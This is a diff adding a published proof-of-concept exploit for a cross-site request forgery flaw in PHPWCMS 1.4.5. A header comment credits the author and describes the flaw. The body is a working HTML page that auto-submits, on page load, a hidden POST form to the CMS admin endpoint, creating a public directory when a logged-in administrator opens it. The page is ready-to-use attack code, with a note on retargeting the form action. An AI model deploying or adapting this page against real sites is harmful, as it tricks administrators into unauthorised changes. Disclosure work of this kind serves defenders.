@@ -1,0 +1,44 @@
+<?php
+	/*
+		Exploit Title: PHPWCMS Cross-Site Request Forgery Vulnerability
+		Date: 06/16/2010
+		Author: Jeremiah Talamantes
+		Software Link: http://phpwcms.googlecode.com/files/phpwcms_r398.zip
+		Version: 1.4.5 r398
+		Tested on: WinXP SP2 (EN) on WAMP 2.0
+		CVE: N/A
+		
+		Jeremiah Talamantes
+		RedTeam Security (RedTeam Labs)
+		http://www.redteamsecure.com/labs
+		
+		Description:
+		A vulnerability has been identified in PHPWCMS, which could be exploited to conduct cross-site request forgery attacks.
+		This issue is caused due to input validation errors in the administrative interface when processing HTTP requests, 
+		which could be exploited by attackers to manipulate certain data by tricking an administrator into visiting a malicious web page.
+	*/
+?>
+<html>
+<head>
+	<title>PHPWCMS 1.4.5 r389 Cross Site Request Forgery</title>
+	<script type="text/javascript">
+		function myfunc () {
+			var frm = document.getElementById("csrf");
+			frm.submit();
+		}
+		window.onload = myfunc;
+	</script>
+</head>
+<body>
+	<!-- Modify the form action parameter to suit your installation -->
+	<form id="csrf" name="csrf" method="POST" action="http://localhost/phpwcms/phpwcms.php?do=files&f=0">
+		<input type="hidden" name="dir_newname" value="Game Over!" />
+		<input type="hidden" name="dir_gallery" value="0" />
+		<input type="hidden" name="dir_sort" value="0" />
+		<input type="hidden" name="dir_aktiv" value="1" />
+		<input type="hidden" name="dir_public" value="1" />
+		<input type="hidden" name="dir_pid" value="0" />
+		<input type="hidden" name="dir_aktion" value="1" />
+	</form>
+</body>
+</html>
